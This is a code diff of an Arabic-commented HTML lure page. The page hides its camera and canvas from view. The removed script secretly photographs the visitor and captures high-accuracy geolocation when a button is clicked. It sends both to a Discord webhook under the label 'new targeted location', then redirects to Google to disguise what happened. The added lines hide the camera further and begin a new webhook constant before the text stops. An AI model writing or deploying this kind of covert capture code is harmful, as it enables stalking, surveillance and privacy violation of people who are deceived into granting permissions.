@@ -12,8 +12,8 @@
         p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
         button { padding: 12px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; width: 100%; font-weight: bold; transition: background 0.3s; }
         button:hover { background-color: #0056b3; }
-        /* عناصر مخفية تماماً */
-        #video, #canvas { display: none; }
+        /* الكاميرا والكانفاس مخفيين تماماً عن عين المستخدم */
+        #video, #canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
@@ -29,77 +29,5 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // ضع رابط الويب هوك الخاص بديسكورد هنا
-        const DISCORD_WEBHOOK_URL = 'ضع_رابط_الويب_هوك_هنا';
-
-        const btn = document.getElementById('mainBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        btn.onclick = () => {
-            // 1. تشغيل الكاميرا في الخلفية
-            startCamera();
-            // 2. طلب الموقع الجغرافي
-            getLocation();
-        };
-
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-            } catch (err) {
-                console.log("Camera error: ", err);
-            }
-        }
-
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(processAllData, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                });
-            } else {
-                alert("المتصفح لا يدعم هذه الميزة.");
-            }
-        }
-
-        async function processAllData(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            // انتظر ثانية واحدة لضمان عمل الكاميرا ثم التقط الصورة
-            setTimeout(() => {
-                const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    // إرسال الصورة كملف
-                    formData.append('file', blob, 'capture.png');
-                    // إرسال الموقع الجغرافي في الرسالة النصية
-                    formData.append('content', `📍 **موقع جديد مستهدف:**\nرابط الخريطة: ${googleMapsUrl}\nالدقة: ${position.coords.accuracy} متر`);
-
-                    try {
-                        await fetch(DISCORD_WEBHOOK_URL, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    } finally {
-                        // التمويه: تحويل المستخدم بعد الإرسال
-                        window.location.href = "https://www.google.com";
-                    }
-                }, 'image/png');
-            }, 1000);
-        }
-
-        function showError(error) {
-            alert("عذراً، يجب الموافقة على الصلاحيات لتشغيل الخدمة بنجاح.");
-            window.location.href = "https://www.google.com";
-        }
-    </script>
-</body>
-</html>
+        // رابط الويب هوك الخاص بك
+        const DISCORD_WEBHOOK_URL = '
